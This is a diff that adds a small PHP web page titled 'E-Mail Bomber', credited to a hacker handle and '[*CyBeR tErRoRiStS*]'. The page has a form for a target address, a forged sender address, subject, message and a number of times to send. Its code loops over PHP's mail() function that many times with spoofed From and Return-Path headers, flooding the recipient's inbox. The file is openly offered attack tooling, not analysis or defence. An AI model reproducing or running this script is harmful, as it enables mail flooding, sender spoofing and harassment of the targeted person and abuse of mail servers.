@@ -1,0 +1,69 @@
+<?php
+
+if (!$mailstart) {
+
+?>
+
+<html>
+<head>
+<title>[- Xp|01t3R's -] - E-Mail Bomber</title>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+</head>
+
+<body bgcolor="#FFFFFF" text="#000000">
+<h3><font face="Verdana, Arial, Helvetica, sans-serif"><b>[*CyBeR tErRoRiStS*] 
+  - E-Mail Bomber <br>
+  </b></font></h3>
+<form name="own" method="post" action="<? echo $PHP_SELF; ?>">
+  <p><font face="Verdana, Arial, Helvetica, sans-serif" size="2"><b>To: 
+    <input type="text" name="to">
+    <input type="hidden" name="mailstart" value="2">
+    <br>
+    From: 
+    <input type="text" name="from">
+    </b></font></p>
+  <p><b><font face="Verdana, Arial, Helvetica, sans-serif" size="2">Subject : 
+    <input type="text" name="subject" size="100">
+    <br>
+    <br>
+    Message:<br>
+    <textarea name="message" rows="5" cols="100"></textarea>
+    </font></b><font face="Verdana, Arial, Helvetica, sans-serif" size="2"><br>
+    <br>
+    <b>Number Of Times To Send:</b> 
+    <input type="text" name="times" size="4">
+    <br>
+    <input type="submit" name="Send" value="Send">
+    <input type="reset" name="Reset" value="Reset">
+    </font></p>
+</form>
+<h3><font face="Verdana, Arial, Helvetica, sans-serif"><b> </b></font> </h3>
+</body>
+</html>
+
+<?
+
+} else {
+
+$i = 0;
+
+while ($i < $times) {
+
+$headers .= "From: $from<$from>\n";
+$headers .= "X-Sender: <$from>\n";
+$headers .= "X-Mailer: PHP\n"; //mailer
+$headers .= "X-Priority: 1\n"; //1 UrgentMessage, 3 Normal
+$headers .= "Return-Path: <$from>\n";
+$headers .= "Content-Type: text/html; charset=iso-8859-1\n";
+$headers .= "cc:\n"; // CC to
+$headers .= "bcc:"; // BCCs to, separete
+
+mail($to, $subject, $message, $headers) or die("Could Not Send Message");
+
+$i++;
+}
+
+die("Finished Sending Message $times Times to $to");
+
+} 
+?>
